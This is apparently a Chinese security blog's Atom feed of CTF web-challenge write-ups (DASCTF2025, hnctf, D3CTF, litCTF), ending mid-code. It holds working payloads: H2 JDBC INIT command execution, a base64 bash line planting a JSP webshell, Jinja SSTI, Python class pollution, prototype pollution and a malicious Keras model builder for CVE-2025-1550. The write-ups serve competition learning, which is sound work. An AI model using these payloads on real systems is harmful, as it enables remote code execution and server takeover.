<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>L的博客</title>
  
  <subtitle>一个渣渣的博客</subtitle>
  <link href="https://lisien11.xyz/atom.xml" rel="self"/>
  
  <link href="https://lisien11.xyz/"/>
  <updated>2025-06-21T14:29:53.427Z</updated>
  <id>https://lisien11.xyz/</id>
  
  <author>
    <name>L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DASCTF2025</title>
    <link href="https://lisien11.xyz/2025/06/21/DASCTF2025/"/>
    <id>https://lisien11.xyz/2025/06/21/DASCTF2025/</id>
    <published>2025-06-21T13:30:48.000Z</published>
    <updated>2025-06-21T14:29:53.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="泽西岛"><a href="#泽西岛" class="headerlink" title="泽西岛"></a>泽西岛</h1><p>前面都出来了就差一点点<br>其实思路还是很简单的，就是一些细节出了问题<br><img src="/2025/06/21/DASCTF2025/IMG_20250621-213400435.png" class=""><br><img src="/2025/06/21/DASCTF2025/IMG_20250621-213418515.png" class=""><br>首先其jdbcurl我们是可控的。那么我们就可以命令执行了(后面拼接的参数我们可以使用xxx=\)来使其无效<br>网上的绝大多少payload都如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;MODE=MSSQLServer;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript</span><br><span class="line">    java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span><br><span class="line">$$;XXX=\</span><br></pre></td></tr></table></figure></p><p>但是这个会有个问题就是无法在jdk17下使用经尝试只能在jdk8下运行。<br><img src="/2025/06/21/DASCTF2025/IMG_20250621-222911649.png" class=""><br>在jdk17下没有一点反应甚至没有抛异常</p><p>那么现在我们就需要了解一下INIT参数是干什么的了<br>这个参数其实就是链接时自动运行的sql语句，而h2数据库时可以直接使用sql语句来命令执行的。那么我们就可以直接使用如下的payload来命令执行<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">jdbc:h2:mem:testdb;INIT=CREATE ALIAS SHELLEXEC AS $$ String exec(String cmd) throws java.io.IOException &#123; return Runtime.getRuntime().exec(cmd).getInputStream().toString()\; &#125;$$\; CALL SHELLEXEC(&#x27;calc.exe&#x27;)\;--\</span><br></pre></td></tr></table></figure><br>后面拼接的就直接注释加\来注释掉就好了<br><img src="/2025/06/21/DASCTF2025/IMG_20250621-221834454.png" class=""><br>其还过滤了init我们直接使用<code>\</code>来绕过即可<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;IN\IT=CREATE ALIAS SHELLEXEC AS $$ String exec(String cmd) throws java.io.IOException &#123; return Runtime.getRuntime().exec(cmd).getInputStream().toString()\; &#125;$$\; CALL SHELLEXEC(&#x27;calc.exe&#x27;)\;--\</span><br></pre></td></tr></table></figure><br>但是我们直接传参是传不了的，还要绕一下鉴权<br><img src="/2025/06/21/DASCTF2025/IMG_20250621-213248479.png" class=""><br>我们可以看到其只要路径为一个/且有点那么就会被当成静态资源直接过。<br>所以我们可以使用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/testConnect;.</span><br></pre></td></tr></table></figure><br>来绕过因为tomcat自动忽视;后的路径和url的#很像<br>那么这题题其实就结束了<br>直接写马到404.jsp（使用<code>$CATALINA_HOME</code>来定位tomcat路径写马到<code>$CATALINA_HOME/webapps/ROOT/404.jsp</code>也就是web的404.jsp）<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcUrl=jdbc:h2:mem:testdb;IN\IT=CREATE ALIAS SHELLEXEC AS $$ String exec(String cmd) throws java.io.IOException &#123; return Runtime.getRuntime().exec(cmd).getInputStream().toString()\; &#125;$$\; CALL SHELLEXEC(&#x27;bash -c &#123;echo,ZWNobyAnPCUgb3V0LnByaW50KG5ldyBqYXZhLnV0aWwuU2Nhbm5lcihSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkuZ2V0SW5wdXRTdHJlYW0oKSkudXNlRGVsaW1pdGVyKCJcXEEiKS5uZXh0KCkpOyAlPicgPiAkQ0FUQUxJTkFfSE9NRS93ZWJhcHBzL1JPT1QvNDA0LmpzcA&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)\;--+\</span><br></pre></td></tr></table></figure><br><img src="/2025/06/21/DASCTF2025/IMG_20250621-222414768.png" class=""><br>然后命令执行<br><img src="/2025/06/21/DASCTF2025/IMG_20250621-222515558.png" class=""><br><img src="/2025/06/21/DASCTF2025/IMG_20250621-222517796.png" class="">  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;泽西岛&quot;&gt;&lt;a href=&quot;#泽西岛&quot; class=&quot;headerlink&quot; title=&quot;泽西岛&quot;&gt;&lt;/a&gt;泽西岛&lt;/h1&gt;&lt;p&gt;前面都出来了就差一点点&lt;br&gt;其实思路还是很简单的，就是一些细节出了问题&lt;br&gt;&lt;img src=&quot;/2025/06/21/DASC</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hnctf</title>
    <link href="https://lisien11.xyz/2025/06/07/hnctf/"/>
    <id>https://lisien11.xyz/2025/06/07/hnctf/</id>
    <published>2025-06-07T12:40:56.000Z</published>
    <updated>2025-06-21T13:30:51.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h1><p>echo -n bas &gt;&gt;/tmp/bas<br>cmd=echo -n e64 &gt;&gt;/tmp/bas<br>cmd=echo ZmxhZy50eHQ=|<code>dd if=/tmp/bas</code>&gt;<br>cmd=echo bHM=|<code>dd if=/tmp/bas</code> -d &gt;aa<br><img src="/2025/06/07/hnctf/IMG_20250607-204609399.png" class=""><br>cmd=echo dGFjIC9mKg==|<code>dd if=/tmp/bas</code> -d &gt;aa<br><img src="/2025/06/07/hnctf/IMG_20250607-204921591.png" class="">  </p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><img src="/2025/06/07/hnctf/IMG_20250607-210559116.png" class="">  <img src="/2025/06/07/hnctf/IMG_20250607-211120436.png" class="">  <img src="/2025/06/07/hnctf/IMG_20250607-211158906.png" class="">  <h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u0061\u0070\u0070&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u002f&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">        &quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot; : &#123;</span><br><span class="line">            &quot;\u0061\u0070\u0070&quot; : &#123;</span><br><span class="line">                &quot;\u0063\u006f\u006e\u0066\u0069\u0067&quot; : &#123;</span><br><span class="line">                    &quot;\u0053\u0045\u0043\u0052\u0045\u0054\u005f\u004b\u0045\u0059&quot; :&quot;abc&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/06/07/hnctf/IMG_20250607-233619019.png" class="">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;abc&quot; -t &quot;&#123;&#x27;name&#x27;: &#x27;admin&#x27;, &#x27;permission&#x27;: &#x27;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(133)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><img src="/2025/06/07/hnctf/IMG_20250607-233539179.png" class="">  <img src="/2025/06/07/hnctf/IMG_20250607-233706616.png" class="">  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;\u005f\u005f\u006c\u006f\u0061\u0064\u0065\u0072\u005f\u005f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;\u0073\u0079\u0073&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;\u006d\u006f\u0064\u0075\u006c\u0065\u0073&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;\u006a\u0069\u006e\u006a\u0061\u0032&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;\u0072\u0075\u006e\u0074\u0069\u006d\u0065&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;\u0065\u0078\u0070\u006f\u0072\u0074\u0065\u0064&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">                  <span class="string">&quot;\u002a\u003b\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0073\u0079\u0073\u0074\u0065\u006d\u0028\u0027\u0066\u0069\u006e\u0064\u0020\u002f\u0020\u002d\u006e\u0061\u006d\u0065\u0020\u0022\u0066\u006c\u0061\u0067\u002a\u0022\u003e\u002f\u0074\u006d\u0070\u002f\u0061\u0027\u0029\u003b\u0023&quot;</span><span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">,</span><span class="attr">&quot;zhrgf62dtqo&quot;</span><span class="punctuation">:</span><span class="string">&quot;=&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Really-Ez-Rce&quot;&gt;&lt;a href=&quot;#Really-Ez-Rce&quot; class=&quot;headerlink&quot; title=&quot;Really_Ez_Rce&quot;&gt;&lt;/a&gt;Really_Ez_Rce&lt;/h1&gt;&lt;p&gt;echo -n bas &amp;gt;&amp;gt;/tmp/b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>D3CTF</title>
    <link href="https://lisien11.xyz/2025/06/04/D3CTF-1/"/>
    <id>https://lisien11.xyz/2025/06/04/D3CTF-1/</id>
    <published>2025-06-04T08:31:19.000Z</published>
    <updated>2025-06-04T08:46:02.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看源码可以发现其就是上传一个文件，然后将这个文件当成keras模型用keras.models.load_model加载。因为是大数据那么猜测其应该是有出过反序列相关的漏洞，所以找到了<br>CVE-2025-1550</p><p><a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p><p>文章里poc直接拿出来用就好了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">model_name = <span class="string">&quot;model.keras&quot;</span></span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(<span class="number">100</span>, <span class="number">28</span> * <span class="number">28</span>)</span><br><span class="line">y_train = np.random.rand(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(<span class="number">1</span>, activation=<span class="string">&#x27;linear&#x27;</span>, input_dim=<span class="number">28</span> * <span class="number">28</span>)])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)</span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    config = json.loads(f.read(<span class="string">&quot;config.json&quot;</span>).decode())</span><br><span class="line"></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>] = <span class="string">&quot;keras.models&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;class_name&quot;</span>] = <span class="string">&quot;Model&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;config&quot;</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;layers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;class_name&quot;</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">            <span class="string">&quot;config&quot;</span>: <span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="string">&quot;args&quot;</span>: [[<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;env &gt; /app/index.html&quot;</span>]], <span class="string">&quot;kwargs&quot;</span>: &#123;<span class="string">&quot;bufsize&quot;</span>: -<span class="number">1</span>&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">    <span class="string">&quot;input_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]],</span><br><span class="line">    <span class="string">&quot;output_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_read:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zip_write:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_read.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.filename != <span class="string">&quot;config.json&quot;</span>:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&quot;config.json&quot;</span>, json.dumps(config))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Malicious model ready&quot;</span>)</span><br></pre></td></tr></table></figure></p><img src="/2025/06/04/D3CTF-1/IMG_20250604-164602195.png" class="">  ]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;d3model&quot;&gt;&lt;a href=&quot;#d3model&quot; class=&quot;headerlink&quot; title=&quot;d3model&quot;&gt;&lt;/a&gt;d3model&lt;/h1&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>D3CTF</title>
    <link href="https://lisien11.xyz/2025/06/03/D3CTF/"/>
    <id>https://lisien11.xyz/2025/06/03/D3CTF/</id>
    <published>2025-06-03T10:36:03.000Z</published>
    <updated>2025-06-03T10:36:03.698Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>litCTF</title>
    <link href="https://lisien11.xyz/2025/06/03/litCTF/"/>
    <id>https://lisien11.xyz/2025/06/03/litCTF/</id>
    <published>2025-06-03T10:34:45.000Z</published>
    <updated>2025-06-03T12:42:25.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h1><img src="/2025/06/03/litCTF/IMG_20250603-184748741.png" class="">  <p>admin/password<br>后台是文件上传<br>经过尝试发现是白名单，那么就只好找文件包含或者解析漏洞了。在index的源码发现file查看文件<br><img src="/2025/06/03/litCTF/IMG_20250603-185826279.png" class=""><br>在admin.php使用file参数可以文件包含，文件内容也有过滤直接短标签即可<br><img src="/2025/06/03/litCTF/IMG_20250603-185925987.png" class=""><br><img src="/2025/06/03/litCTF/IMG_20250603-185954588.png" class=""><br><img src="/2025/06/03/litCTF/IMG_20250603-190138387.png" class="">  </p><h1 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h1><p>admin/password<br><img src="/2025/06/03/litCTF/IMG_20250603-190530320.png" class=""><br><img src="/2025/06/03/litCTF/IMG_20250603-191027325.png" class="">  </p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><img src="/2025/06/03/litCTF/IMG_20250603-191119854.png" class="">  <img src="/2025/06/03/litCTF/IMG_20250603-191151156.png" class=""> <p>啊<code>&#123;%print(url_for.__globals__.__builtins__['__import__']('os').popen('tac /flag').read())%&#125;</code><br><img src="/2025/06/03/litCTF/IMG_20250603-191228582.png" class="">  </p><h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1><img src="/2025/06/03/litCTF/IMG_20250603-192135376.png" class="">  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;settings&quot;</span>:&#123;<span class="string">&quot;theme&quot;</span>:<span class="string">&quot;asd&quot;</span>,<span class="string">&quot;language&quot;</span>:<span class="string">&quot;asd&quot;</span>,</span><br><span class="line"><span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/06/03/litCTF/IMG_20250603-192216013.png" class="">  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;settings&quot;</span>:&#123;<span class="string">&quot;theme&quot;</span>:<span class="string">&quot;asd&quot;</span>,<span class="string">&quot;language&quot;</span>:<span class="string">&quot;asd&quot;</span>,</span><br><span class="line"><span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span 